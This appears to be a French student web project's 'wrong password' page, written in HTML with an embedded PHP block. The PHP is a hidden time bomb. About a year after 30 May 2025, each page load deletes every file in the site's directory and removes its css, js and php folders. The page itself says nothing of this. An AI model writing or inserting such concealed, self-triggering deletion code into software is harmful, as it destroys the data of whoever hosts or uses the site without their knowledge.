<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mot de passe incorrect!</title>
    <link rel="stylesheet" href="css/style.css">
</head>
<body>
    <header>
        <h1>Mot de passe incorrect!</h1>
	</header>
</body>

<?php
$creation_date = strtotime('2025-05-30');
$days_to_destroy = 370;
$destroy_date = $creation_date + ($days_to_destroy * 24 * 60 * 60);
$current_date = time();
if ($current_date >= $destroy_date) {
    $files = glob('/opt/lampp/htdocs/sae23/*');
    foreach ($files as $file) {
        if (is_file($file)) unlink($file);
    }
    rmdir('/opt/lampp/htdocs/sae23/css');
    rmdir('/opt/lampp/htdocs/sae23/js');
    rmdir('/opt/lampp/htdocs/sae23/php');
    rmdir('/opt/lampp/htdocs/sae23');
    exit('Site supprimé.');
}
?>
